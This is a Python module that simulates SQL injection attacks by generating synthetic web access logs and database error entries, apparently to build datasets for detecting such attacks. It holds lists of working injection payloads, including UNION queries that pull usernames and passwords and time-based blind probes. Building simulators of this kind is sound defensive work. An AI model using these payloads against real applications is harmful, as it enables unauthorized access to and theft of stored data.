"""SQL injection attack simulator."""

from __future__ import annotations

import random
import urllib.parse
from typing import Any, Dict, List, Optional

from .base_simulator import BaseSimulator, _rand_external_ip, _rand_internal_ip


# ---------------------------------------------------------------------------
# Payload libraries
# ---------------------------------------------------------------------------

_CLASSIC_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'x'='x",
    "admin'--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
]

_UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
    "1 UNION SELECT @@version,NULL--",
    "' UNION SELECT user(),database()--",
]

_BLIND_PAYLOADS = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SUBSTRING(username,1,1)='a",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
]

_ERROR_PAYLOADS = [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
]

_TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "'; SELECT SLEEP(5)--",
    "1; SELECT pg_sleep(5)--",
    "1') AND SLEEP(5) AND ('1'='1",
]

_DB_ERRORS = [
    "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version",
    "ORA-01756: quoted string not properly terminated",
    "Microsoft OLE DB Provider for SQL Server error '80040e14'",
    "PostgreSQL ERROR: unterminated quoted string at or near",
    "Warning: mysql_num_rows() expects parameter 1 to be resource",
    "Fatal error: Call to a member function fetch_assoc() on bool",
    "SQLSTATE[42000]: Syntax error or access violation",
]

_WEB_PATHS = [
    "/search", "/product", "/user/profile", "/api/v1/items",
    "/login", "/admin/users", "/report", "/order",
]

_USER_AGENTS = [
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "Mozilla/5.0 (compatible; sqlmap)",
    "python-requests/2.28.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
]


class SQLInjectionSimulator(BaseSimulator):
    """
    Simulates SQL injection attacks against a web application.

    Generates Apache/Nginx-style access log lines and optional
    database error log entries.
    """

    scenario_name = "sql_injection"

    def __init__(
        self,
        *,
        target_url: str = "http://app.internal",
        attacker_ip: Optional[str] = None,
        attack_intensity: int = 3,
        start_time=None,
        seed: Optional[int] = None,
    ) -> None:
        super().__init__(
            attacker_ip=attacker_ip,
            start_time=start_time,
            seed=seed,
        )
        self.target_url = target_url
        # intensity 1-5 maps to roughly 20-200 requests
        self.attack_intensity = max(1, min(5, attack_intensity))
        self._request_count = self.attack_intensity * 40

    # ------------------------------------------------------------------

    def simulate(self, **params: Any) -> List[Dict[str, Any]]:
        logs: List[Dict[str, Any]] = []

        # Mix of injection types based on intensity
        injection_types = ["classic", "union", "blind"]
        if self.attack_intensity >= 3:
            injection_types.append("error_based")
        if self.attack_intensity >= 4:
            injection_types.append("time_based")

        timestamps = self._jittered_timestamps(self._request_count, max_interval=2.0)
        ua = random.choice(_USER_AGENTS)
        path = random.choice(_WEB_PATHS)

        for i, ts in enumerate(timestamps):
            injection_type = random.choice(injection_types)
            payload = self._pick_payload(injection_type)
            encoded_payload = urllib.parse.quote(payload)

            param = random.choice(["id", "search", "q", "user", "cat", "page"])
            full_path = f"{path}?{param}={encoded_payload}"

            # Determine response: 500 error, 403 WAF block, or 200 success
            if "SLEEP" in payload or "WAITFOR" in payload:
                status = 200
                resp_time = random.randint(5000, 8000)
            elif random.random() < 0.15:
                status = 403
                resp_time = random.randint(50, 200)
            elif random.random() < 0.3:
                status = 500
                resp_time = random.randint(100, 500)
            else:
                status = 200
                resp_time = random.randint(80, 400)

            bytes_sent = random.randint(400, 4000)
            ts_str = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
            raw_access = (
                f'{self.attacker_ip} - - [{ts_str}] '
                f'"GET {full_path} HTTP/1.1" {status} {bytes_sent} '
                f'"-" "{ua}"'
            )
            severity = "high" if status == 200 else ("medium" if status == 500 else "info")

            log_entry = self._log_template(
                offset_seconds=(ts - self.start_time).total_seconds(),
                event_type="web_attack",
                source_ip=self.attacker_ip,
                dest_ip=_rand_internal_ip(),
                hostname=self.target_host,
                message=f"SQL injection attempt [{injection_type}]: {payload[:60]}",
                severity=severity,
                raw=raw_access,
                protocol="http",
                dest_port=443 if self.target_url.startswith("https") else 80,
                http_method="GET",
                http_path=full_path,
                http_status=status,
                bytes_sent=bytes_sent,
                response_time_ms=resp_time,
                user_agent=ua,
                injection_type=injection_type,
                payload=payload,
                attack_vector="sql_injection",
            )
            logs.append(log_entry)

            # Generate database error log for 500 responses
            if status == 500:
                db_err_ts = ts
                db_error = random.choice(_DB_ERRORS)
                error_log = self._log_template(
                    offset_seconds=(db_err_ts - self.start_time).total_seconds() + 0.01,
                    event_type="database_error",
                    source_ip=_rand_internal_ip(),
                    dest_ip=_rand_internal_ip(),
                    hostname=self.target_host,
                    message=f"DB Error: {db_error}",
                    severity="high",
                    protocol="internal",
                    error_message=db_error,
                    triggered_by_request=log_entry["id"],
                    attack_vector="sql_injection",
                )
                logs.append(error_log)

        return logs

    # ------------------------------------------------------------------

    def _pick_payload(self, injection_type: str) -> str:
        mapping = {
            "classic": _CLASSIC_PAYLOADS,
            "union": _UNION_PAYLOADS,
            "blind": _BLIND_PAYLOADS,
            "error_based": _ERROR_PAYLOADS,
            "time_based": _TIME_PAYLOADS,
        }
        return random.choice(mapping.get(injection_type, _CLASSIC_PAYLOADS))
